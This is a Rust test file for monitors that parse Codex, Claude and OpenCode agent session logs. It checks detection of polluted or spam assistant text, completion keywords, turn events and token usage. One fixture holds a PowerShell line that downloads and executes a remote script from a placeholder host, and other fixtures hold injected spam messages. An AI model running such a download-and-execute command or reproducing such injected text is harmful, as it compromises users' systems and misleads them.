        fs::OpenOptions::new()
            .append(true)
            .open(&session_file)
            .unwrap()
            .write_all(
                (json!({"timestamp": "2026-05-17T16:29:07.000Z", "type": "response_item", "payload": {"type": "message", "role": "assistant", "content": [{"text": "公益 暂停 通知群 123"}]}}).to_string()
                    + "\n"
                    + &json!({"timestamp": "2026-05-17T16:29:08.000Z", "type": "event_msg", "payload": {"type": "task_started", "turn_id": "t1"}}).to_string()
                    + "\n"
                    + &json!({"timestamp": "2026-05-17T16:29:09.000Z", "type": "event_msg", "payload": {"type": "task_complete", "turn_id": "t1"}}).to_string()
                    + "\n")
                    .as_bytes(),
            )
            .unwrap();
        thread::sleep(Duration::from_millis(5));
        monitor.poll();

        assert!(monitor.pollution_detected);
        assert!(!monitor.completion_pause_detected);
        assert!(!monitor.has_inflight_turn());
        assert!(monitor.last_task_finished_at.is_some());
    }

    #[test]
    fn monitor_skips_pollution_detection_without_keywords() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp.path().join("sessions/2026/05/17/rollout.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::write(
            &session_file,
            [
                json!({"type": "session_meta", "timestamp": "2026-05-17T16:29:00.000Z", "payload": {"id": "session-1", "cwd": workdir.to_string_lossy()}}).to_string(),
                json!({"timestamp": "2026-05-17T16:29:06.000Z", "type": "response_item", "payload": {"type": "message", "role": "assistant", "content": [{"text": "PowerShell iwr https://example.invalid/a.ps1 | iex"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();
        let mut monitor = CodexSessionMonitor::new(
            tmp.path().to_path_buf(),
            workdir,
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            Some("session-1".to_string()),
            vec![],
            vec![],
            0.35,
            12,
            300,
        );

        monitor.poll();

        assert!(!monitor.pollution_detected);
    }

    #[test]
    fn monitor_pollution_detection_uses_configured_keywords_only() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp.path().join("sessions/2026/05/17/rollout.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::write(
            &session_file,
            [
                json!({"type": "session_meta", "timestamp": "2026-05-17T16:29:00.000Z", "payload": {"id": "session-1", "cwd": workdir.to_string_lossy()}}).to_string(),
                json!({"timestamp": "2026-05-17T16:29:06.000Z", "type": "response_item", "payload": {"type": "message", "role": "assistant", "content": [{"text": "Join our channel 175877552 for free API token, stop for 10 minutes"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();
        let mut monitor = CodexSessionMonitor::new(
            tmp.path().to_path_buf(),
            workdir,
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            Some("session-1".to_string()),
            vec!["余额不足".to_string()],
            vec![],
            0.35,
            12,
            300,
        );

        monitor.poll();

        assert!(!monitor.pollution_detected);
    }

    #[test]
    fn codex_turn_aborted_does_not_mark_endpoint_failure() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp.path().join("sessions/2026/05/17/rollout.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::write(
            &session_file,
            [
                json!({"type": "session_meta", "timestamp": "2026-05-17T16:29:00.000Z", "payload": {"id": "session-1", "cwd": workdir.to_string_lossy()}}).to_string(),
                json!({"timestamp": "2026-05-17T16:29:08.000Z", "type": "event_msg", "payload": {"type": "task_started", "turn_id": "t1"}}).to_string(),
                json!({"timestamp": "2026-05-17T16:29:09.000Z", "type": "event_msg", "payload": {"type": "turn_aborted", "turn_id": "t1"}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();
        let mut monitor = CodexSessionMonitor::new(
            tmp.path().to_path_buf(),
            workdir,
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            Some("session-1".to_string()),
            vec![],
            vec![],
            0.35,
            12,
            300,
        );

        monitor.begin_waiting_for_new_turn();
        monitor.poll();

        assert!(!monitor.endpoint_failure_detected);
        assert!(!monitor.has_inflight_turn());
        assert!(monitor.last_task_finished_at.is_some());
        assert!(!monitor.has_assistant_message_since_wait_start());
    }

    #[test]
    fn codex_monitor_retries_partial_jsonl_line_without_skipping_turn_event() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp.path().join("sessions/2026/05/17/rollout.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::write(
            &session_file,
            json!({"type": "session_meta", "timestamp": "2026-05-17T16:29:00.000Z", "payload": {"id": "session-1", "cwd": workdir.to_string_lossy()}}).to_string()
                + "\n"
                + "{\"timestamp\":\"2026-05-17T16:29:08.000Z\",\"type\":\"event_msg\",\"payload\":{\"type\":\"task_started\",\"turn_id\":\"",
        )
        .unwrap();
        let mut monitor = CodexSessionMonitor::new(
            tmp.path().to_path_buf(),
            workdir,
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            Some("session-1".to_string()),
            vec![],
            vec![],
            0.35,
            12,
            300,
        );

        monitor.begin_waiting_for_new_turn();
        monitor.poll();
        assert!(!monitor.has_inflight_turn());

        fs::OpenOptions::new()
            .append(true)
            .open(&session_file)
            .unwrap()
            .write_all(b"t1\"}}\n")
            .unwrap();
        monitor.poll();

        assert!(monitor.has_inflight_turn());
        assert!(monitor.last_task_started_at.is_some());
    }

    #[test]
    fn claude_monitor_retries_partial_jsonl_line_without_skipping_pollution() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp
            .path()
            .join("projects/-tmp-project/claude-session-1.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::write(
            &session_file,
            json!({"cwd": workdir.to_string_lossy(), "type": "summary", "summary": "context"}).to_string()
                + "\n"
                + "{\"timestamp\":\"2026-05-17T16:29:02.000Z\",\"type\":\"assistant\",\"message\":{\"role\":\"assistant\",\"content\":[{\"type\":\"text\",\"text\":\"",
        )
        .unwrap();
        let mut monitor = ClaudeSessionMonitor::new(
            tmp.path().to_path_buf(),
            workdir,
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            None,
            vec!["公益".to_string(), "通知群".to_string()],
            vec![],
            0.35,
            12,
            300,
        );

        monitor.poll();
        assert!(!monitor.pollution_detected);

        fs::OpenOptions::new()
            .append(true)
            .open(&session_file)
            .unwrap()
            .write_all("公益 通知群\"}]}}\n".as_bytes())
            .unwrap();
        monitor.poll();

        assert!(monitor.pollution_detected);
    }

    #[test]
    fn codex_waiting_turn_resets_session_tail_watchdog_baseline() {
        let mut monitor = CodexSessionMonitor::new(
            PathBuf::from(".codex"),
            PathBuf::from("."),
            Utc::now(),
            None,
            Vec::new(),
            Vec::new(),
            0.35,
            12,
            300,
        );
        monitor.last_session_append_at = Some(Instant::now() - Duration::from_secs(300));
        monitor.session_path = Some(PathBuf::from("session.jsonl"));

        monitor.begin_waiting_for_new_turn();

        assert!(!monitor.session_tail_stalled(Duration::from_secs(60)));
    }

    #[test]
    fn codex_partial_session_tail_bytes_count_as_activity() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp.path().join("sessions/2026/05/17/rollout.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        let meta = json!({"type": "session_meta", "timestamp": "2026-05-17T16:29:00.000Z", "payload": {"id": "session-1", "cwd": workdir.to_string_lossy()}}).to_string() + "\n";
        fs::write(&session_file, &meta).unwrap();
        let mut monitor = CodexSessionMonitor::new(
            tmp.path().to_path_buf(),
            workdir,
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            Some("session-1".to_string()),
            Vec::new(),
            Vec::new(),
            0.35,
            12,
            300,
        );
        monitor.session_path = Some(session_file.clone());
        monitor.position = fs::metadata(&session_file).unwrap().len();
        monitor.last_session_append_at = Some(Instant::now() - Duration::from_secs(300));
        fs::write(
            &session_file,
            meta + "{\"timestamp\":\"2026-05-17T16:29:08.000Z\",\"type\":\"event_msg\"",
        )
        .unwrap();

        monitor.poll();

        assert!(!monitor.session_tail_stalled(Duration::from_secs(60)));
    }

    #[test]
    fn claude_monitor_detects_assistant_completion_keyword() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp
            .path()
            .join("projects/-tmp-project/claude-session-1.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::write(
            &session_file,
            [
                json!({"cwd": workdir.to_string_lossy(), "type": "summary", "summary": "context"}).to_string(),
                json!({"timestamp": "2026-05-17T16:29:01.000Z", "type": "user", "message": {"role": "user", "content": [{"type": "text", "text": "任务完成时告诉我"}]}}).to_string(),
                json!({"timestamp": "2026-05-17T16:29:02.000Z", "type": "assistant", "message": {"role": "assistant", "content": [{"type": "text", "text": "任务完成，测试通过。"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();

        let mut monitor = ClaudeSessionMonitor::new(
            tmp.path().to_path_buf(),
            workdir,
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            None,
            vec![],
            vec!["任务完成".to_string()],
            0.35,
            12,
            300,
        );

        monitor.poll();

        assert_eq!(monitor.session_id, Some("claude-session-1".to_string()));
        assert!(monitor.completion_pause_detected);
    }

    #[test]
    fn claude_monitor_does_not_pause_auto_continuation_for_polluted_completion_text() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp
            .path()
            .join("projects/-tmp-project/claude-session-1.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::write(
            &session_file,
            [
                json!({"cwd": workdir.to_string_lossy(), "type": "summary", "summary": "context"}).to_string(),
                json!({"timestamp": "2026-05-17T16:29:02.000Z", "type": "assistant", "message": {"role": "assistant", "content": [{"type": "text", "text": "公益 暂停 通知群 123"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();

        let mut monitor = ClaudeSessionMonitor::new(
            tmp.path().to_path_buf(),
            workdir,
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            None,
            vec!["公益".to_string(), "通知群".to_string()],
            vec!["暂停".to_string()],
            0.35,
            12,
            300,
        );

        monitor.poll();

        assert!(monitor.pollution_detected);
        assert!(!monitor.completion_pause_detected);
    }

    #[test]
    fn claude_monitor_ignores_old_session_when_waiting_for_new_file() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp
            .path()
            .join("projects/-tmp-project/claude-session-old.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::write(
            &session_file,
            [
                json!({"cwd": workdir.to_string_lossy(), "type": "summary"}).to_string(),
                json!({"timestamp": "2026-05-17T16:29:02.000Z", "type": "assistant", "message": {"role": "assistant", "content": [{"type": "text", "text": "任务完成，旧会话。"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();
        let launch_started_at = Utc::now() + chrono::Duration::hours(1);
        let mut monitor = ClaudeSessionMonitor::new(
            tmp.path().to_path_buf(),
            workdir,
            launch_started_at,
            None,
            vec![],
            vec!["任务完成".to_string()],
            0.35,
            12,
            300,
        );

        monitor.poll();

        assert_eq!(monitor.session_id, None);
        assert!(!monitor.completion_pause_detected);
    }

    #[test]
    fn claude_monitor_waits_for_terminal_stop_reason_after_tool_use() {
        let launched_at = DateTime::parse_from_rfc3339("2026-08-14T10:00:00Z")
            .unwrap()
            .with_timezone(&Utc);
        let mut monitor = ClaudeSessionMonitor::new(
            PathBuf::from(".claude"),
            PathBuf::from("D:/Works/SelfWorks/WatchApi"),
            launched_at,
            Some("claude-session-1".to_string()),
            vec![],
            vec![],
            0.35,
            12,
            300,
        );
        monitor.begin_waiting_for_new_turn();

        monitor.observe_item(&json!({
            "timestamp": "2026-08-14T10:00:01Z",
            "type": "assistant",
            "message": {
                "id": "tool-message",
                "role": "assistant",
                "stop_reason": "tool_use",
                "content": [{"type": "tool_use", "name": "Read"}],
                "usage": {
                    "input_tokens": 10,
                    "cache_creation_input_tokens": 2,
                    "cache_read_input_tokens": 3,
                    "output_tokens": 4
                }
            }
        }));

        assert!(monitor.has_assistant_message_since_wait_start());
        assert!(!monitor.has_completed_assistant_message_since_wait_start());
        assert!(monitor.has_inflight_turn());

        monitor.observe_item(&json!({
            "timestamp": "2026-08-14T10:00:02Z",
            "type": "assistant",
            "message": {
                "id": "final-message",
                "role": "assistant",
                "stop_reason": "end_turn",
                "content": [{"type": "text", "text": "完成。"}],
                "usage": {
                    "input_tokens": 20,
                    "cache_read_input_tokens": 5,
                    "output_tokens": 6
                }
            }
        }));

        assert!(monitor.has_completed_assistant_message_since_wait_start());
        assert!(!monitor.has_inflight_turn());
        assert_eq!(
            monitor.token_usage_total,
            TokenUsage {
                input_tokens: 40,
                cached_input_tokens: 8,
                output_tokens: 10,
                reasoning_output_tokens: 0,
                total_tokens: 50,
            }
        );
    }

    #[test]
    fn opencode_export_parser_detects_assistant_completion_keyword() {
        let workdir = PathBuf::from("D:/Works/SelfWorks/WatchApi");
        let exported = json!({
            "messages": [
                {"role": "user", "content": "任务完成时告诉我"},
                {"role": "assistant", "timestamp": "2026-05-17T16:29:01.000Z", "content": [{"type": "text", "text": "任务完成，测试通过。"}]}
            ]
        });
        let mut monitor = OpenCodeSessionMonitor::new(
            vec!["opencode".to_string()],
            workdir,
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            Some("opencode-session-1".to_string()),
            vec![],
            vec!["任务完成".to_string()],
            0.35,
            12,
            300,
        );
        monitor.begin_waiting_for_new_turn();

        monitor.observe_exported_value(&exported);

        assert!(monitor.completion_pause_detected);
        assert!(monitor.has_completed_assistant_message_since_wait_start());
    }

    #[test]
    fn opencode_export_parser_handles_current_cli_message_schema() {
        let workdir = PathBuf::from("D:/Works/SelfWorks/WatchApi");
        let launched_at = DateTime::parse_from_rfc3339("2026-08-14T10:00:00Z")
            .unwrap()
            .with_timezone(&Utc);
        let exported = json!({
            "messages": [
                {
                    "info": {
                        "role": "assistant",
                        "time": {"created": (launched_at - chrono::Duration::minutes(1)).timestamp_millis()},
                        "id": "old-message"
                    },
                    "parts": [{"type": "text", "text": "任务完成，但这是旧消息"}]
                },
                {
                    "info": {
                        "role": "assistant",
                        "time": {"created": (launched_at + chrono::Duration::seconds(2)).timestamp_millis()},
                        "id": "new-message"
                    },
                    "parts": [{"type": "text", "text": "任务完成，测试通过。"}]
                }
            ]
        });
        let mut monitor = OpenCodeSessionMonitor::new(
            vec!["opencode".to_string()],
            workdir,
            launched_at,
            Some("opencode-session-1".to_string()),
            vec![],
            vec!["任务完成".to_string()],
            0.35,
            12,
            300,
        );

        monitor.observe_exported_value(&exported);

        assert!(monitor.completion_pause_detected);
        assert!(!monitor.seen_fingerprint.is_empty());
    }

    #[test]
    fn opencode_monitor_waits_for_stop_after_tool_calls() {
        let workdir = PathBuf::from("D:/Works/SelfWorks/WatchApi");
        let launched_at = DateTime::parse_from_rfc3339("2026-08-14T10:00:00Z")
            .unwrap()
            .with_timezone(&Utc);
        let mut monitor = OpenCodeSessionMonitor::new(
            vec!["opencode".to_string()],
            workdir,
            launched_at,
            Some("opencode-session-1".to_string()),
            vec![],
            vec![],
            0.35,
            12,
            300,
        );
        monitor.begin_waiting_for_new_turn();
        let tool_message = json!({
            "info": {
                "id": "tool-message",
                "role": "assistant",
                "finish": "tool-calls",
                "time": {
                    "created": (launched_at + chrono::Duration::seconds(1)).timestamp_millis(),
                    "completed": (launched_at + chrono::Duration::seconds(2)).timestamp_millis()
                },
                "tokens": {
                    "input": 100,
                    "output": 20,
                    "reasoning": 5,
                    "cache": {"read": 40, "write": 0}
                }
            },
            "parts": [{"type": "tool", "tool": "read"}]
        });

        monitor.observe_exported_value(&json!({"messages": [tool_message.clone()]}));

        assert!(monitor.has_assistant_message_since_wait_start());
        assert!(!monitor.has_completed_assistant_message_since_wait_start());
        assert!(monitor.has_inflight_turn());

        monitor.observe_exported_value(&json!({
            "messages": [
                tool_message,
                {
                    "info": {
                        "id": "final-message",
                        "role": "assistant",
                        "finish": "stop",
                        "time": {
                            "created": (launched_at + chrono::Duration::seconds(3)).timestamp_millis(),
                            "completed": (launched_at + chrono::Duration::seconds(4)).timestamp_millis()
                        },
                        "tokens": {
                            "input": 50,
                            "output": 10,
                            "reasoning": 0,
                            "cache": {"read": 0, "write": 0}
                        }
                    },
                    "parts": [{"type": "text", "text": "完成。"}]
                }
            ]
        }));

        assert!(monitor.has_completed_assistant_message_since_wait_start());
        assert!(!monitor.has_inflight_turn());
        assert_eq!(
            monitor.token_usage_total,
            TokenUsage {
                input_tokens: 150,
                cached_input_tokens: 40,
                output_tokens: 35,
                reasoning_output_tokens: 5,
                total_tokens: 185,
            }
        );
    }

    #[test]
    fn opencode_monitor_throttles_cli_exports() {
        let mut monitor = OpenCodeSessionMonitor::new(
            vec!["opencode".to_string()],
            PathBuf::from("D:/Works/SelfWorks/WatchApi"),
            Utc::now(),
            Some("opencode-session-1".to_string()),
            vec![],
            vec![],
            0.35,
            12,
            300,
        );
        let now = Instant::now();

        assert!(monitor.reserve_cli_poll_slot(now));
        assert!(!monitor.reserve_cli_poll_slot(now + OPENCODE_MONITOR_POLL_INTERVAL / 2));
        assert!(monitor.reserve_cli_poll_slot(now + OPENCODE_MONITOR_POLL_INTERVAL));
    }

    #[test]
    fn opencode_cli_discovery_uses_agent_inside_shell_wrapper() {
        let command = vec![
            "pwsh.exe".to_string(),
            "-NoProfile".to_string(),
            "-Command".to_string(),
            "C:/Tools/opencode.exe".to_string(),
            "--auto".to_string(),
        ];

        assert_eq!(
            opencode_cli_executable(&command),
            Some("C:/Tools/opencode.exe")
        );
        assert_eq!(
            opencode_cli_executable(&["C:/Tools/opencode.exe".to_string()]),
            Some("C:/Tools/opencode.exe")
        );
    }

    #[test]
    fn opencode_index_reads_legacy_sessions_without_running_the_cli() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        let session_file = tmp.path().join("storage/session/project-id/ses_root.json");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::create_dir_all(&workdir).unwrap();
        fs::write(
            &session_file,
            serde_json::to_vec_pretty(&json!({
                "id": "ses_root",
                "directory": workdir,
                "title": "修复 OpenCode 会话恢复",
                "time": {"updated": 1_784_003_400_000_i64}
            }))
            .unwrap(),
        )
        .unwrap();
        fs::write(
            session_file.parent().unwrap().join("ses_child.json"),
            serde_json::to_vec_pretty(&json!({
                "id": "ses_child",
                "parentID": "ses_root",
                "directory": workdir,
                "title": "Background task",
                "time": {"updated": 1_784_003_500_000_i64}
            }))
            .unwrap(),
        )
        .unwrap();
        let store = SessionStore::new(tmp.path().join("state.json"));

        let candidates = OpenCodeSessionIndex::new(vec!["missing-opencode".to_string()])
            .with_data_dir(tmp.path().to_path_buf())
            .ranked_candidates(&workdir, "配置", "opencode", &store);

        assert_eq!(candidates.len(), 1);
        assert_eq!(candidates[0].session_id, "ses_root");
        assert_eq!(candidates[0].path, session_file);
        assert!(candidates[0].summary.contains("修复 OpenCode"));
        assert_eq!(
            candidates[0].modified_at,
            DateTime::<Utc>::from_timestamp_millis(1_784_003_400_000_i64)
        );
    }

    #[test]
    fn opencode_new_session_detection_rejects_prelaunch_and_recently_updated_old_sessions() {
        let workdir = PathBuf::from("D:/Works/SelfWorks/WatchApi");
        let launched_at = DateTime::parse_from_rfc3339("2026-08-14T10:00:00Z")
            .unwrap()
            .with_timezone(&Utc);
        let old_created = (launched_at - chrono::Duration::days(1)).timestamp_millis();
        let old_updated = (launched_at + chrono::Duration::seconds(8)).timestamp_millis();
        let new_created = (launched_at + chrono::Duration::seconds(5)).timestamp_millis();
        let new_updated = (launched_at + chrono::Duration::seconds(5)).timestamp_millis();
        let sessions = json!([
            {
                "id": "old-session",
                "directory": workdir,
                "created": old_created,
                "updated": old_updated
            },
            {
                "id": "new-session",
                "directory": workdir,
                "created": new_created,
                "updated": new_updated
            }
        ]);

        assert_eq!(
            new_opencode_session_id_since(&sessions, &workdir, launched_at, None),
            Some("new-session".to_string())
        );
        assert_eq!(
            new_opencode_session_id_since(
                &json!([{
                    "id": "old-session",
                    "directory": workdir,
                    "created": old_created,
                    "updated": old_updated
                }]),
                &workdir,
                launched_at,
                None
            ),
            None
        );
    }

    #[test]
    fn opencode_new_session_detection_only_accepts_ids_absent_from_launch_baseline() {
        let workdir = PathBuf::from("D:/Works/SelfWorks/WatchApi");
        let launched_at = DateTime::parse_from_rfc3339("2026-08-14T10:00:00Z")
            .unwrap()
            .with_timezone(&Utc);
        let recent = (launched_at + chrono::Duration::seconds(1)).timestamp_millis();
        let sessions = json!([
            {
                "id": "known-session",
                "directory": workdir,
                "created": recent,
                "updated": recent
            },
            {
                "id": "background-session",
                "parentID": "new-session",
                "directory": workdir,
                "created": recent,
                "updated": recent
            },
            {
                "id": "new-session",
                "directory": workdir,
                "created": recent,
                "updated": recent
            }
        ]);
        let known = HashSet::from(["known-session".to_string()]);

        assert_eq!(
            new_opencode_session_id_since(&sessions, &workdir, launched_at, Some(&known)),
            Some("new-session".to_string())
        );
    }

    #[test]
    fn opencode_monitor_does_not_pause_auto_continuation_for_polluted_completion_text() {
        let workdir = PathBuf::from("D:/Works/SelfWorks/WatchApi");
        let exported = json!({
            "messages": [
                {"role": "assistant", "timestamp": "2026-05-17T16:29:01.000Z", "content": [{"type": "text", "text": "公益 暂停 通知群 123"}]}
            ]
        });
        let mut monitor = OpenCodeSessionMonitor::new(
            vec!["opencode".to_string()],
            workdir,
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            Some("opencode-session-1".to_string()),
            vec!["公益".to_string(), "通知群".to_string()],
            vec!["暂停".to_string()],
            0.35,
            12,
            300,
        );

        monitor.observe_exported_value(&exported);

        assert!(monitor.pollution_detected);
        assert!(!monitor.completion_pause_detected);
    }

    #[test]
    fn continuation_trigger_rules_use_regexes_and_match_ratio() {
        let rules = vec![ContinuationTriggerRule {
            keywords: vec!["(?i)todo\\b".to_string(), "FIXME".to_string()],
            threshold: 0.5,
            prompt: "先处理待办项。".to_string(),
        }];

        assert_eq!(
            continuation_trigger_prompt_for_text("发现 TODO，后续继续。", &rules),
            Some("先处理待办项。".to_string())
        );
        assert_eq!(
            continuation_trigger_prompt_for_text("没有待办项。", &rules),
            None
        );
    }

    #[test]
    fn first_matching_continuation_trigger_rule_wins() {
        let rules = vec![
            ContinuationTriggerRule {
                keywords: vec!["TODO".to_string()],
                threshold: 1.0,
                prompt: "先执行第一条。".to_string(),
            },
            ContinuationTriggerRule {
                keywords: vec!["TODO".to_string()],
                threshold: 1.0,
                prompt: "不应执行第二条。".to_string(),
            },
        ];

        assert_eq!(
            continuation_trigger_prompt_for_text("TODO: continue", &rules),
            Some("先执行第一条。".to_string())
        );
    }
}
